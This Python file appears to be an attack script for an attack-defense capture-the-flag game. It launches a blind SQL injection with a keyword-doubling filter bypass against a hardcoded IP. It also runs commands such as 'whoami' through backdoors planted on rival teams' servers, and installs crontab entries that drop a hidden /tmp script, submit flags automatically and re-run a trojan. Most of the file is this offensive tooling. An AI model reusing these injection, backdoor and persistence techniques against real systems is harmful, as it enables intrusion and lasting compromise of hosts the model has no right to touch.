import backdoor
import webAttact
import weapons
import requests
import config
import tools
import time
import ssh
import random
import threading
import base64
import os
def blindSql():
    length=32
    webAttact.MapAttacker('http://123.206.87.240:9004/1ndex.php?id=5\' aandnd {0} --+',length,0,65536).StartAttack()

def bckDoor(w):
    w.useBckDoorIndex=0 #使用哪个后门
    
    # print(backdoor.eachIp(w.trojTime))
    # print(backdoor.eachIpArgs(w.runCmd,'*.php'))
    print(backdoor.eachIpArgs(w.runCmd,'ls -al'))
    print(backdoor.eachIpArgs(w.runTeamCmd,'system(\'whoami\')'))
    
    print(backdoor.eachIpArgs(buildAndRunCrontabCmd,w))
def buildAndRunCrontabCmd(index,w):
    rawCrontabStr_autoSubmit=tools.buildCrontab('*',config.gameUrl,f'token={config.token}&flag=`date +\'%s\'`',1)
    rawCrontabStr_troj=tools.buildCrontab('*',w.team[index].trojContent,'',2)

    crontabStr,md5Str=tools.buildCmd(f"{rawCrontabStr_autoSubmit}\n{rawCrontabStr_troj}")
    w.runTeamCmd(index,f'system(\'{crontabStr}\')')
    return w.runTeamCmd(index,f'system(\'/usr/bin/crontab /tmp/.--{md5Str}.sh\')')

class Runner(threading.Thread):
    def __init__(self,function,args,constantRun=False):
        super(Runner,self).__init__()
        self.function=function
        self.args=args
        self.constantRun=constantRun
    def run(self):
        while True:
            self.Result=function(args)
            if not self.constantRun:
                return
if __name__ == "__main__":
    print('script start')
    ssh=ssh.SSHserver(ssh.SSHserver.configStart())
    ssh.connect()
    ssh.backupserver()
    stdin,stdout,stderr=ssh.execCmd('ls -al /app')
    print(stdout.read().decode())
    ssh.disconnect()
    #blindSql()
    # for i in range(1):
    #     Runner(True).start()
    
    pass
